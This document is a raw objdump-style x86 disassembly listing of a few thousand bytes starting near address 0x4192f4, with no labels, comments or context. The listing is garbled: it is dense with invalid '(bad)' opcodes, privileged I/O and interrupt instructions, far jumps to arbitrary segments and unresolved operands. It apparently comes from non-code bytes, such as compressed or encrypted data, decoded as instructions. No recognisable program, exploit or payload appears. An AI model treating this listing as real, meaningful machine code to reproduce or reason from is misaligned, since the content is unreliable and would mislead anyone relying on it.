  4192f4:	adc    ch,bl
  4192f6:	jnp    0x41933d
  4192f8:	mov    esi,0xe001b3b6
  4192fd:	pop    ds
  4192fe:	xchg   edi,eax
  4192ff:	ins    BYTE PTR es:[edi],dx
  419300:	mov    bh,dl
  419302:	xor    DWORD PTR [ebp+0x2e],ebx
  419305:	fimul  DWORD PTR [edx]
  419307:	cmp    edx,DWORD PTR [esi+edi*2+0x49166840]
  41930e:	push   eax
  41930f:	and    edx,edx
  419311:	adc    DWORD PTR [eax-0x450a0be9],0xffffff86
  419318:	shr    DWORD PTR [edx+0x6bc2a30e],cl
  41931e:	je     0x41932a
  419320:	dec    ecx
  419321:	lods   eax,DWORD PTR ds:[esi]
  419322:	not    dl
  419324:	and    BYTE PTR [ecx-0x75],dl
  419327:	ins    BYTE PTR es:[edi],dx
  419328:	popa   
  419329:	add    eax,0x544a5512
  41932e:	push   ebx
  41932f:	sub    ebp,DWORD PTR [eax-0x72901739]
  419335:	mov    ebx,0x9d554d64
  41933a:	add    al,0x83
  41933c:	iret   
  41933d:	mov    BYTE PTR [ebx+0x1a],ah
  419340:	sahf   
  419341:	adc    BYTE PTR [edx+0x2c],0x2d
  419345:	ret    
  419346:	dec    eax
  419347:	and    al,0x76
  419349:	fcompp 
  41934b:	jl     0x4192eb
  41934d:	sti    
  41934e:	js     0x41935d
  419350:	ins    DWORD PTR es:[edi],dx
  419351:	sti    
  419352:	mov    ebx,0x8ac5b4fb
  419357:	and    dh,bh
  419359:	or     BYTE PTR [edx-0x78],ch
  41935c:	sbb    bh,0x85
  41935f:	pop    esp
  419360:	xor    DWORD PTR [ebx],0xb1cd3e7a
  419366:	inc    ebx
  419367:	dec    edx
  419368:	jae    0x419308
  41936a:	mov    ch,0x18
  41936c:	or     eax,0x58a33abe
  419371:	adc    DWORD PTR [ecx-0x68],eax
  419374:	fsub   QWORD PTR [esi]
  419376:	lahf   
  419377:	out    0x33,eax
  419379:	mov    al,ds:0xf6a0c6e7
  41937e:	les    eax,FWORD PTR [esi-0x22]
  419381:	push   ebx
  419382:	jle    0x41930a
  419384:	addr16 jle 0x4193d6
  419387:	cmp    al,ah
  419389:	xor    al,0x9
  41938b:	jno    0x4193df
  41938d:	retf   0xad7c
  419390:	dec    DWORD PTR [eax]
  419392:	ins    DWORD PTR es:[edi],dx
  419393:	add    al,0x64
  419395:	fist   DWORD PTR [edx-0x1b2b9ef3]
  41939b:	xchg   ecx,eax
  41939c:	mov    cl,0xf1
  41939e:	inc    esp
  41939f:	or     eax,0x18b0f265
  4193a4:	mov    ebp,0xf13ae5bd
  4193a9:	sbb    ebx,0xf4acf942
  4193af:	mov    al,0x4c
  4193b1:	push   ecx
  4193b2:	aad    0xf4
  4193b4:	sbb    ecx,0xffffffca
  4193b7:	js     0x4193bf
  4193b9:	test   eax,0x639fc23e
  4193be:	jnp    0x419389
  4193c0:	popf   
  4193c1:	leavew 
  4193c3:	sbb    ecx,DWORD PTR [esi+0x39809314]
  4193c9:	aam    0x20
  4193cb:	mov    eax,0xa645f728
  4193d0:	or     al,0xee
  4193d2:	cmp    ch,BYTE PTR [ebx]
  4193d4:	cmp    DWORD PTR [ecx-0x52e1b75],esi
  4193da:	push   0xffffff93
  4193dc:	add    al,0xfd
  4193de:	test   al,0x81
  4193e0:	add    BYTE PTR [esi],bh
  4193e2:	or     al,bh
  4193e4:	aaa    
  4193e5:	jne    0x4193ec
  4193e7:	xchg   BYTE PTR [edi+ebx*4],al
  4193ea:	iret   
  4193eb:	xchg   edi,eax
  4193ec:	xchg   ebx,eax
  4193ed:	push   eax
  4193ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ef:	je     0x41940b
  4193f1:	jmp    0xec42715e
  4193f6:	cmp    ecx,DWORD PTR [esi+0xc]
  4193f9:	jbe    0x419397
  4193fb:	imul   eax,DWORD PTR [ebp+0x1a],0xffffffba
  4193ff:	pop    edx
  419400:	in     eax,dx
  419401:	jecxz  0x419403
  419403:	outs   dx,BYTE PTR ds:[esi]
  419404:	test   DWORD PTR [edx-0x64b16696],esi
  41940a:	jnp    0x4193d3
  41940c:	cs repz aam 0x53
  419410:	push   edx
  419411:	ja     0x4193cf
  419413:	mov    ebp,0x9854620e
  419418:	push   edi
  419419:	jmp    0x9b6180e2
  41941e:	pop    eax
  41941f:	or     eax,0x790c3771
  419424:	outs   dx,BYTE PTR ds:[si]
  419426:	dec    edi
  419427:	icebp  
  419428:	ins    BYTE PTR es:[edi],dx
  419429:	xor    ecx,DWORD PTR [esi-0x38]
  41942c:	jecxz  0x41942d
  41942e:	push   eax
  41942f:	push   ebp
  419430:	mov    dl,0xd6
  419432:	dec    esp
  419433:	sbb    esp,ecx
  419435:	mov    cl,0x80
  419437:	loope  0x4193be
  419439:	es cmp al,0xbf
  41943c:	add    BYTE PTR [eax-0x3b],0x7a
  419440:	push   ebx
  419441:	cmp    eax,0x476dfcea
  419446:	push   cs
  419447:	sub    BYTE PTR [ecx-0x1d98023d],ah
  41944d:	stos   DWORD PTR es:[edi],eax
  41944e:	inc    esi
  41944f:	cmp    ebp,edi
  419451:	lahf   
  419452:	mov    bl,0xec
  419454:	aam    0x70
  419456:	js     0x4193e2
  419458:	dec    esp
  419459:	xchg   esi,eax
  41945a:	leave  
  41945b:	loopne 0x419485
  41945d:	push   es
  41945e:	mov    ebx,0x95171f55
  419463:	cmp    DWORD PTR [ecx],ebp
  419465:	(bad)  
  419466:	mov    ds:0xa9a299ce,al
  41946b:	jb     0x419430
  41946d:	pop    ebp
  41946e:	dec    esi
  41946f:	mov    dh,0xa6
  419471:	je     0x4193fa
  419473:	es inc esp
  419475:	inc    edx
  419476:	xor    dl,dl
  419478:	and    ebx,DWORD PTR [ecx-0x33]
  41947b:	push   0x3f
  41947d:	enter  0xe742,0x1f
  419481:	stc    
  419482:	push   ss
  419483:	test   DWORD PTR [edx+0x2d],esi
  419486:	popa   
  419487:	loop   0x4194a9
  419489:	jnp    0x4194a8
  41948b:	iret   
  41948c:	sti    
  41948d:	push   edi
  41948e:	inc    esp
  41948f:	push   es
  419490:	dec    ebx
  419491:	sbb    eax,0xadbba721
  419496:	fs dec esp
  419498:	mov    ecx,0x85
	...
  419511:	add    BYTE PTR [eax],al
  419513:	add    BYTE PTR [esp+ebp*2],bl
  419516:	ins    DWORD PTR es:[edi],dx
  419517:	les    edi,FWORD PTR [ebp-0x3b]
  41951a:	mov    ebp,0x7e8bcdfc
  41951f:	jae    0x4194a6
  419521:	push   es
  419522:	fiadd  WORD PTR [ebp+0x1363d]
  419528:	outs   dx,BYTE PTR ds:[esi]
  419529:	pop    es
  41952a:	add    BYTE PTR [eax],al
  41952c:	inc    esp
  41952d:	xchg   DWORD PTR [ebx],edi
  41952f:	add    al,0xd2
  419531:	fistp  DWORD PTR [esi+0x62]
  419534:	inc    edi
  419535:	jmp    0xc056:0xc156b5e3
  41953c:	ja     0x419515
  41953e:	push   eax
  41953f:	mov    WORD PTR ds:0xdd57cd1d,ds
  419545:	xor    bl,ah
  419547:	sbb    ah,BYTE PTR [edi]
  419549:	mov    dl,al
  41954b:	(bad)  [edi+0x29]
  41954e:	fs stc 
  419550:	cmp    al,0xe
  419552:	jne    0x41956b
  419554:	xlat   BYTE PTR ds:[ebx]
  419555:	mov    bh,0x4
  419557:	cmp    DWORD PTR [ebp-0x679cc374],esp
  41955d:	sub    bl,bl
  41955f:	mov    al,0x1b
  419561:	mov    ebx,esp
  419563:	fidivr DWORD PTR [ebp-0x5b]
  419566:	mov    ebx,0xaeaddbd8
  41956b:	jg     0x419586
  41956d:	inc    esp
  41956e:	xor    al,0xe0
  419570:	or     BYTE PTR [eax+0x496198ec],dl
  419576:	std    
  419577:	retf   
  419578:	ret    0x3711
  41957b:	dec    ebx
  41957c:	or     dh,BYTE PTR ss:[edi]
  41957f:	jle    0x4195da
  419581:	enter  0xc3d7,0x8a
  419585:	mov    dl,BYTE PTR [eax-0x1cb98cb1]
  41958b:	mov    cl,0x2e
  41958d:	and    ecx,DWORD PTR [edx+esi*1]
  419590:	ss jmp 0xd848:0x97131579
  419598:	mov    al,BYTE PTR [ebx-0x33]
  41959b:	mov    eax,ds:0xebff3b1c
  4195a0:	cwde   
  4195a1:	loop   0x419571
  4195a3:	sub    bh,BYTE PTR [esi-0x316ce851]
  4195a9:	push   es
  4195aa:	stc    
  4195ab:	inc    ecx
  4195ac:	jle    0x4195b2
  4195ae:	mov    al,0xf8
  4195b0:	inc    ecx
  4195b1:	fild   DWORD PTR [esi-0x4ee761a]
  4195b7:	or     dh,BYTE PTR [ebp-0x1c12c56c]
  4195bd:	jo     0x419596
  4195bf:	mov    ch,0xcf
  4195c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195c2:	add    al,0x24
  4195c4:	add    al,0x53
  4195c6:	push   0x41
  4195c8:	cmp    dh,ah
  4195ca:	push   ecx
  4195cb:	repz daa 
  4195cd:	pop    ss
  4195ce:	sub    eax,0x7c107ccf
  4195d3:	mov    al,0xb9
  4195d5:	and    DWORD PTR [eax+0x70],ebp
  4195d8:	daa    
  4195d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195da:	jg     0x41955d
  4195dc:	sub    DWORD PTR [edi+0x13],edi
  4195df:	jmp    0x25dcbca1
  4195e4:	in     al,0x6a
  4195e6:	dec    ebx
  4195e7:	mov    bh,0xdb
  4195e9:	sar    BYTE PTR [eax-0xb],cl
  4195ec:	imul   edx,DWORD PTR [esi+0x2d088592],0xf0e3af82
  4195f6:	enter  0x8e7b,0x64
  4195fa:	push   edi
  4195fb:	in     al,dx
  4195fc:	int    0xe5
  4195fe:	sbb    eax,0xb9a5cc6c
  419603:	div    esi
  419605:	push   esp
  419606:	push   cs
  419607:	imul   ecx,esi,0x47
  41960a:	jnp    0x4195a4
  41960c:	jmp    0x8343d59
  419611:	mov    al,ds:0x22b83876
  419616:	(bad)  
  419617:	retf   0xf51a
  41961a:	mov    al,bh
  41961c:	dec    esp
  41961d:	jg     0x4195b6
  41961f:	in     eax,0x6e
  419621:	fsub   QWORD PTR [ecx]
  419623:	or     BYTE PTR [ecx+0x1ea4ba79],bl
  419629:	inc    eax
  41962a:	push   DWORD PTR [esi]
  41962c:	mov    edx,0xb6ba7ed6
  419631:	inc    esp
  419632:	cmp    eax,DWORD PTR [ebp+0x30]
  419635:	aad    0xdb
  419637:	adc    eax,0x87fc1fb8
  41963c:	lahf   
  41963d:	sub    ebp,ebp
  41963f:	cmp    BYTE PTR [ecx+0x553c2827],0xf3
  419646:	add    BYTE PTR ds:0xcfc99c8f,dh
  41964c:	sub    eax,DWORD PTR [ebp-0x3e]
  41964f:	xor    DWORD PTR [edx-0xe],0x9aa7ebd
  419656:	mov    ?,WORD PTR [eax+0x3fe7ca66]
  41965c:	add    eax,0x94252be2
  419661:	xchg   esp,eax
  419662:	jle    0x41966f
  419664:	inc    esi
  419665:	in     eax,dx
  419666:	shr    DWORD PTR [ebx-0x1f],0xa4
  41966a:	cmp    bh,BYTE PTR [ecx+0x21aa0be8]
  419670:	push   DWORD PTR [ebx]
  419672:	test   DWORD PTR [esp+eiz*8+0x2e],0xaaa6202d
  41967a:	mov    bl,0xb3
  41967c:	dec    esp
  41967d:	shl    DWORD PTR [edi-0x73],1
  419680:	mov    dl,0x10
  419682:	jnp    0x419650
  419684:	scas   al,BYTE PTR es:[edi]
  419685:	out    0x26,al
  419687:	mov    eax,0xad3ca646
  41968c:	mov    ds:0xdfe08fb4,eax
  419691:	jo     0x41967a
  419693:	sub    eax,DWORD PTR [ebx+ebx*1-0x2efd6174]
  41969a:	outs   dx,BYTE PTR ds:[esi]
  41969b:	fsubr  DWORD PTR [ebp+0x5edeff49]
  4196a1:	or     al,al
  4196a3:	jg     0x41962d
  4196a5:	jecxz  0x419652
  4196a7:	xchg   edx,eax
  4196a8:	stos   DWORD PTR es:[edi],eax
  4196a9:	xor    edi,esi
  4196ab:	scas   eax,DWORD PTR es:[edi]
  4196ac:	pop    ebp
  4196ad:	hlt    
  4196ae:	sub    DWORD PTR [eax-0x75],0x30
  4196b2:	inc    esp
  4196b3:	fistp  QWORD PTR [ecx-0x6a]
  4196b6:	int3   
  4196b7:	pusha  
  4196b8:	or     al,0x1
  4196ba:	mov    fs,WORD PTR [edi+0x3]
  4196bd:	xchg   ebx,eax
  4196be:	nop
  4196bf:	stos   BYTE PTR es:[edi],al
  4196c0:	(bad)  
  4196c1:	mov    esp,0xe06aff1b
  4196c6:	test   BYTE PTR [ebp-0xa],ch
  4196c9:	test   al,0x6f
  4196cb:	aad    0x35
  4196cd:	stos   DWORD PTR es:[edi],eax
  4196ce:	mov    ecx,0x6c6506af
  4196d3:	retf   0xec8d
  4196d6:	rol    WORD PTR [esi-0x7e],0x4a
  4196db:	jns    0x419681
  4196dd:	and    DWORD PTR [esi-0x58cf9a26],eax
  4196e3:	pop    ss
  4196e4:	daa    
  4196e5:	test   DWORD PTR [ebx],edi
  4196e7:	repz mov bl,0xc9
  4196ea:	and    al,0x2d
  4196ec:	inc    esi
  4196ed:	cmp    al,0x89
  4196ef:	in     eax,dx
  4196f0:	iret   
  4196f1:	pusha  
  4196f2:	inc    edx
  4196f3:	scas   eax,DWORD PTR es:[edi]
  4196f4:	and    al,0xbb
  4196f7:	cld    
  4196f8:	ss pop ss
  4196fa:	dec    ebp
  4196fb:	pop    ss
  4196fc:	call   FWORD PTR [edi-0x5376d5ff]
  419702:	enter  0x668d,0x3d
  419706:	pop    ecx
  419707:	add    ebx,0x5
  41970a:	fsub   st(4),st
  41970c:	cmp    al,0x68
  41970e:	loopne 0x419734
  419710:	push   edi
  419711:	push   esp
  419712:	mov    dl,0x69
  419714:	sbb    al,0xe6
  419716:	stos   DWORD PTR es:[edi],eax
  419717:	ss sahf 
  419719:	sub    BYTE PTR ds:0x6a818409,al
  41971f:	push   ss
  419720:	and    DWORD PTR [esi],0xd0c8ba2b
  419726:	lds    ecx,FWORD PTR [edi+eax*4]
  419729:	and    eax,0x6895c6db
  41972e:	sbb    al,0xe3
  419730:	inc    esp
  419731:	retf   0x6120
  419734:	jnp    0x419719
  419736:	mov    al,0x4b
  419738:	mov    bl,0x84
  41973a:	popa   
  41973b:	mov    ch,0xe9
  41973d:	xor    ebp,DWORD PTR [eax]
  41973f:	lods   al,BYTE PTR ds:[esi]
  419740:	iret   
  419741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419742:	loope  0x4197b4
  419744:	xchg   DWORD PTR [esi-0x52],edi
  419747:	jp     0x41978c
  419749:	imul   cl
  41974b:	outs   dx,DWORD PTR ds:[esi]
  41974c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41974d:	mov    eax,ds:0xd9cbca40
  419752:	push   ds
  419753:	push   0xf9ed980d
  419758:	ins    BYTE PTR es:[edi],dx
  419759:	adc    al,0x80
  41975b:	pop    ss
  41975c:	xchg   eax,ecx
  41975e:	push   edi
  41975f:	repnz in eax,dx
  419761:	push   edi
  419762:	cmp    ah,bl
  419764:	xchg   esp,eax
  419765:	mov    cl,0x46
  419767:	inc    ebp
  419768:	pop    eax
  419769:	inc    esi
  41976a:	cmp    eax,0x93019965
  41976f:	xor    DWORD PTR [ebx+0x36],esp
  419772:	mov    dl,0x4d
  419774:	aaa    
  419775:	add    al,0x9c
  419777:	int    0xe6
  419779:	mov    esp,0x2cdfa35a
  41977e:	jae    0x4197b0
  419780:	inc    edi
  419781:	mov    ch,0x89
  419783:	jmp    0x9ab4:0xdddc0df
  41978a:	dec    esp
  41978b:	push   ecx
  41978c:	cmp    eax,0x7f26ec51
  419791:	es mov esp,0x4380047c
  419797:	ret    0x8a30
  41979a:	xchg   esi,eax
  41979c:	pusha  
  41979d:	cs push cs
  41979f:	imul   esp,DWORD PTR [ecx+0x51e308a2],0x99661d0e
  4197a9:	pushf  
  4197aa:	jmp    FWORD PTR [esi]
  4197ac:	int3   
  4197ad:	daa    
  4197ae:	(bad)  
  4197af:	in     al,0x1e
  4197b1:	scas   eax,DWORD PTR es:[edi]
  4197b2:	popf   
  4197b3:	and    eax,esi
  4197b5:	je     0x4197e8
  4197b7:	fild   DWORD PTR [esi+0x2d]
  4197ba:	push   ebx
  4197bb:	add    eax,ecx
  4197bd:	sbb    eax,0x3b15030e
  4197c2:	mov    ecx,DWORD PTR [esi]
  4197c4:	iret   
  4197c5:	and    edi,DWORD PTR [ebx-0x31]
  4197c8:	inc    edx
  4197c9:	adc    bl,BYTE PTR [ebx]
  4197cb:	xchg   DWORD PTR [edx],eax
  4197cd:	loope  0x4197b2
  4197cf:	or     edx,edx
  4197d1:	cli    
  4197d2:	lods   al,BYTE PTR ds:[esi]
  4197d3:	xor    al,0x91
  4197d5:	mov    esp,esi
  4197d7:	scas   al,BYTE PTR es:[edi]
  4197d8:	pop    ecx
  4197d9:	daa    
  4197da:	mov    DWORD PTR [edx-0x336b4b18],ecx
  4197e0:	xor    eax,0x8e1611dd
  4197e5:	push   edi
  4197e6:	and    al,0x35
  4197e8:	mov    ah,0xe8
  4197ea:	jge    0x4197cf
  4197ec:	pusha  
  4197ed:	xchg   esi,eax
  4197ee:	gs mov edi,0x6e8f517e
  4197f4:	jbe    0x4197d3
  4197f6:	out    0x63,eax
  4197f8:	stc    
  4197f9:	fmul   DWORD PTR [ebx+0x622ff67b]
  4197ff:	sub    DWORD PTR [ecx+ebx*8-0x5f68aae6],0x24501ebc
  41980a:	test   DWORD PTR [eax],ebp
  41980c:	fisub  WORD PTR [edx-0x540b2047]
  419812:	iret   
  419813:	push   cs
  419814:	inc    ebx
  419815:	mov    ch,0xb0
  419817:	push   ecx
  419818:	scas   eax,DWORD PTR es:[edi]
  419819:	inc    esp
  41981a:	xor    DWORD PTR [edi+0x27],esp
  41981d:	loop   0x4197ee
  41981f:	pop    edx
  419820:	pusha  
  419821:	xchg   DWORD PTR [edi+edi*4],esp
  419824:	sub    ebp,ebp
  419826:	repz mov edx,0x2f3f3f00
  41982c:	popf   
  41982d:	popa   
  41982e:	dec    eax
  41982f:	mov    cl,0x22
  419831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419832:	push   es
  419833:	dec    edi
  419834:	xchg   ebp,eax
  419835:	dec    esp
  419836:	pop    eax
  419837:	bound  ebp,QWORD PTR [ebp-0x7db11c1c]
  41983d:	repz cmp cl,BYTE PTR [eax]
  419840:	jle    0x4198c0
  419842:	stc    
  419843:	sbb    BYTE PTR [ebp-0x1a],0x38
  419847:	fisubr DWORD PTR [edi+ecx*4+0x12]
  41984b:	xchg   esi,eax
  41984c:	inc    eax
  41984d:	add    BYTE PTR [esi-0x56a38dc0],bl
  419853:	cmp    BYTE PTR [esi],0x89
  419856:	mov    fs,WORD PTR [eax-0x74]
  419859:	xchg   ecx,eax
  41985a:	mov    DWORD PTR [edx+0x6a],ecx
  41985d:	out    dx,al
  41985e:	outs   dx,BYTE PTR ds:[esi]
  41985f:	ins    BYTE PTR es:[edi],dx
  419860:	mov    ?,edi
  419862:	inc    ebp
  419863:	pop    ecx
  419864:	test   DWORD PTR [edx-0x73],0xef0fe68d
  41986b:	ja     0x4198e1
  41986d:	cmp    al,0x47
  41986f:	pop    edi
  419870:	loop   0x4198e0
  419872:	jmp    0x4198d1
  419874:	ss dec ebp
  419876:	and    eax,0x197decbb
  41987b:	jo     0x4198c4
  41987d:	dec    esp
  41987e:	arpl   WORD PTR ds:0xfb2387f9,ax
  419884:	add    dl,BYTE PTR [eax-0x269c7dbf]
  41988a:	rcl    esp,1
  41988c:	add    ah,BYTE PTR [ecx+0x44]
  41988f:	cdq    
  419890:	ret    
  419891:	jle    0x419903
  419893:	mov    bl,0xba
  419895:	div    BYTE PTR [ecx]
  419897:	into   
  419898:	inc    edx
  419899:	cmp    cl,0xdb
  41989c:	ret    
  41989d:	cwde   
  41989e:	pop    ebp
  41989f:	jmp    0x419832
  4198a1:	scas   al,BYTE PTR es:[edi]
  4198a2:	xchg   edx,eax
  4198a3:	mov    eax,0x71177f37
  4198a8:	lock loop 0x4198f2
  4198ab:	in     eax,0xa9
  4198ad:	push   edi
  4198ae:	aaa    
  4198af:	fwait
  4198b0:	jno    0x4198fa
  4198b2:	(bad)  
  4198b3:	das    
  4198b4:	sbb    bh,BYTE PTR [ecx-0x4374eda2]
  4198ba:	bound  ecx,QWORD PTR [ebx+0x38]
  4198bd:	and    ah,dl
  4198bf:	pop    edx
  4198c0:	mov    ch,0x79
  4198c2:	add    DWORD PTR [eax],0xc2c518ff
  4198c8:	jl     0x419928
  4198ca:	cmp    bl,BYTE PTR [edx+esi*1-0x37987720]
  4198d1:	xor    BYTE PTR [ecx],bl
  4198d3:	or     DWORD PTR [ecx+0xa],edi
  4198d6:	clc    
  4198d7:	gs push ds
  4198d9:	inc    edx
  4198da:	es jnp 0x391ae4a1
  4198e1:	std    
  4198e2:	sbb    bh,ah
  4198e4:	jl     0x419962
  4198e6:	mov    al,ds:0xeda8a0f0
  4198eb:	push   edi
  4198ec:	push   ss
  4198ed:	shl    BYTE PTR [edx],cl
  4198ef:	out    0x3f,eax
  4198f1:	push   esp
  4198f2:	mov    edi,0x295add68
  4198f7:	fwait
  4198f8:	call   FWORD PTR [esi+ebp*1-0x6d2cdcb8]
  4198ff:	pop    es
  419900:	fdivrp st(6),st
  419902:	in     eax,dx
  419903:	aam    0x2
  419905:	imul   esp,DWORD PTR [eax+0x294a1c9b],0xdfb0ea9b
  41990f:	mov    dh,0x5a
  419911:	or     dh,BYTE PTR [eax]
  419913:	jo     0x4198cd
  419915:	jp     0x41994e
  419917:	xchg   ebp,eax
  419918:	inc    ecx
  419919:	enter  0xb9a3,0xd4
  41991d:	pop    esp
  41991e:	jb     0x4198b9
  419920:	cdq    
  419921:	mov    dl,0xeb
  419923:	outs   dx,DWORD PTR ds:[esi]
  419924:	enter  0x95ec,0xf9
  419928:	sub    ebx,DWORD PTR [eax+0x380e2499]
  41992e:	adc    edi,ebx
  419930:	(bad)  
  419931:	jge    0x419901
  419933:	inc    edi
  419934:	clc    
  419935:	xlat   BYTE PTR ds:[ebx]
  419936:	xor    esp,0x3c
  419939:	popa   
  41993a:	mul    ebx
  41993c:	jnp    0x419966
  41993e:	pop    esp
  41993f:	outs   dx,BYTE PTR ds:[esi]
  419940:	or     BYTE PTR [esi+0xea8a1db],al
  419946:	stc    
  419947:	enter  0xe5df,0xc8
  41994b:	(bad)  [eax+0x483d7827]
  419951:	(bad)  
  419952:	pop    eax
  419953:	int3   
  419954:	mov    al,ds:0x2ed88ab8
  419959:	xor    ch,cl
  41995b:	add    eax,0x8a96fe3c
  419960:	fcomp  DWORD PTR [edi+0x1de5513e]
  419966:	outs   dx,BYTE PTR ds:[esi]
  419967:	mov    dl,0x3b
  419969:	cs retf 
  41996b:	mov    al,0xf7
  41996d:	or     eax,0x9c0100b
  419972:	ins    DWORD PTR es:[edi],dx
  419973:	enter  0x5d6a,0x21
  419977:	or     eax,0x81165e98
  41997c:	addr16 inc ebp
  41997e:	dec    ebp
  41997f:	ins    BYTE PTR es:[edi],dx
  419980:	fst    DWORD PTR [edx]
  419982:	mov    ecx,0x2d8e2dc4
  419987:	and    ecx,edx
  419989:	pop    ebx
  41998a:	sub    eax,0x390f694b
  41998f:	bound  edx,QWORD PTR [esi]
  419991:	aaa    
  419992:	xchg   esp,eax
  419993:	lea    esi,[ebx-0x3135fe76]
  419999:	pop    eax
  41999a:	add    ecx,DWORD PTR [ebx+edi*4]
  41999d:	cwde   
  41999e:	add    BYTE PTR [ebp-0x79682de],bh
  4199a4:	xor    DWORD PTR [edi-0x21],esp
  4199a7:	inc    esi
  4199a8:	imul   esp,ecx,0x6d
  4199ab:	xchg   edi,eax
  4199ac:	or     BYTE PTR [esi+0x53],cl
  4199af:	aam    0x57
  4199b1:	test   eax,0x600384e5
  4199b6:	les    esi,FWORD PTR [ecx-0x6e6d652d]
  4199bc:	nop
  4199bd:	xor    al,0x43
  4199bf:	push   ebp
  4199c0:	shr    BYTE PTR [edx+esi*8+0x62],cl
  4199c4:	test   cl,ch
  4199c6:	test   ch,cl
  4199c8:	data16 fcomip st,st(7)
  4199cb:	dec    ebp
  4199cc:	adc    al,0x3f
  4199ce:	aad    0x87
  4199d0:	shr    ebp,1
  4199d2:	jae    0x4199ee
  4199d4:	fstp   QWORD PTR [ecx-0x6025109c]
  4199da:	sub    al,0xaf
  4199dc:	push   eax
  4199dd:	retf   0x8b70
  4199e0:	push   ebx
  4199e1:	neg    BYTE PTR [esi-0x6b824b5a]
  4199e7:	inc    edx
  4199e8:	dec    ecx
  4199e9:	inc    eax
  4199ea:	inc    ebx
  4199eb:	or     DWORD PTR [eax+edi*2+0x74],esi
  4199ef:	cmp    DWORD PTR [edi],edi
  4199f1:	loop   0x419a46
  4199f3:	push   ecx
  4199f4:	fist   DWORD PTR [eax-0x3c]
  4199f7:	ins    BYTE PTR es:[edi],dx
  4199f8:	div    edi
  4199fa:	add    esi,ecx
  4199fc:	fwait
  4199fd:	aaa    
  4199fe:	repnz adc al,0x32
  419a01:	in     al,0x1f
  419a03:	jp     0x1d4f6acc
  419a09:	xchg   BYTE PTR [edx-0x6859de91],bl
  419a0f:	and    eax,0x5c30fa6f
  419a14:	(bad)  
  419a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a16:	pop    edx
  419a17:	not    BYTE PTR [eax+0x792da3c6]
  419a1d:	pusha  
  419a1e:	mov    al,ds:0x7e6352e5
  419a23:	int    0x3a
  419a25:	cdq    
  419a26:	pop    ecx
  419a27:	int3   
  419a28:	aam    0xf0
  419a2a:	dec    eax
  419a2b:	xchg   edi,eax
  419a2c:	(bad)  
  419a2d:	push   esp
  419a2e:	xchg   DWORD PTR [edi],ebx
  419a30:	push   esp
  419a31:	and    ah,BYTE PTR [edx+0x6ee3367c]
  419a37:	mov    ds:0xb7bd7ee9,eax
  419a3c:	aam    0xba
  419a3e:	les    edx,FWORD PTR [esi+0x507e5dae]
  419a44:	mov    ebp,0xed62e85a
  419a49:	punpckldq mm2,DWORD PTR [esi]
  419a4c:	div    DWORD PTR [edx-0x4f]
  419a4f:	neg    BYTE PTR [edx-0x2872a834]
  419a55:	and    eax,0xaa4bbabd
  419a5a:	neg    DWORD PTR [eax+0x2b]
  419a5d:	dec    ebp
  419a5e:	xor    ch,0xd8
  419a61:	cmp    dh,0x3c
  419a64:	popf   
  419a65:	sti    
  419a66:	enter  0x2c86,0x9b
  419a6a:	cmp    eax,DWORD PTR [edx-0x1aaec8d4]
  419a70:	or     ch,BYTE PTR [ebx-0x18]
  419a73:	push   cs
  419a74:	mov    bh,0x45
  419a76:	imul   esp,ecx,0xa993f479
  419a7c:	mov    eax,0x6d7169a
  419a81:	in     al,0xa9
  419a83:	pop    eax
  419a84:	mov    WORD PTR [ebx-0x5649abb1],ds
  419a8a:	pop    es
  419a8b:	sbb    eax,0xf16e9d3f
  419a90:	push   eax
  419a91:	xor    eax,0xae0360b8
  419a96:	std    
  419a97:	mov    al,ds:0x58a16037
  419a9c:	gs pop esi
  419a9e:	test   eax,0xbc8da91f
  419aa3:	aad    0x6b
  419aa5:	pop    ebx
  419aa6:	adc    DWORD PTR [edi+0x3e],edx
  419aa9:	jns    0x419a65
  419aab:	rcl    BYTE PTR [ebx+0xef50e1c],0x4c
  419ab2:	(bad)  
  419ab3:	iret   
  419ab4:	xchg   edi,eax
  419ab5:	jo     0x419a83
  419ab7:	push   eax
  419ab8:	sbb    ebx,DWORD PTR [esi-0x19]
  419abb:	jo     0x419aaf
  419abd:	popa   
  419abe:	dec    edi
  419abf:	not    BYTE PTR [eax+0x3]
  419ac2:	xchg   edx,eax
  419ac3:	jmp    0x6fda97b9
  419ac8:	jo     0x419b15
  419aca:	sub    DWORD PTR [ecx],esi
  419acc:	push   0x4dbfab2e
  419ad1:	mov    ds:0x4a2bff6b,al
  419ad6:	pop    edi
  419ad7:	xchg   edx,eax
  419ad8:	clc    
  419ad9:	mov    eax,0xff03438b
  419ade:	inc    esi
  419adf:	in     al,0xe1
  419ae1:	leave  
  419ae2:	push   ecx
  419ae3:	mov    eax,ds:0x56ab1b31
  419ae8:	test   BYTE PTR [eax],bh
  419aea:	popa   
  419aeb:	inc    edi
  419aec:	je     0x419b68
  419aee:	fisubr DWORD PTR [ebp+ebx*1-0x46]
  419af2:	inc    ebx
  419af3:	sub    ch,cl
  419af5:	mov    esi,0xc42de7cc
  419afa:	jo     0x419a87
  419afc:	xor    DWORD PTR [edx],edi
  419afe:	fisttp DWORD PTR [edi+edx*1-0x5b]
  419b02:	cs xchg ecx,eax
  419b04:	jno    0x419af2
  419b06:	cmp    DWORD PTR [ebx+0x53],0xf388e387
  419b0d:	pop    esi
  419b0e:	xchg   DWORD PTR [edx],ebx
  419b10:	xchg   ecx,eax
  419b11:	jmp    0x23bc:0xd6fb66c2
  419b18:	jne    0x419b52
  419b1a:	cmp    edi,esi
  419b1c:	pop    ebx
  419b1d:	cmp    BYTE PTR [edx+0x60],dh
  419b20:	inc    edx
  419b21:	stc    
  419b22:	idiv   DWORD PTR [esp+edx*1-0x7df01db4]
  419b29:	jp     0x419b80
  419b2b:	push   ebp
  419b2c:	in     al,0xa2
  419b2e:	mov    ds,WORD PTR [ebp-0x6d250334]
  419b34:	jg     0x419b0e
  419b36:	cmp    BYTE PTR [eax],bh
  419b38:	clc    
  419b39:	add    eax,0x2848426
  419b3e:	jb     0x419add
  419b40:	sar    DWORD PTR [eax],1
  419b42:	xchg   BYTE PTR [esi],al
  419b44:	cmc    
  419b45:	cwde   
  419b46:	ror    DWORD PTR [ecx],1
  419b48:	int    0x70
  419b4a:	data16 fadd QWORD PTR [ebx-0x25]
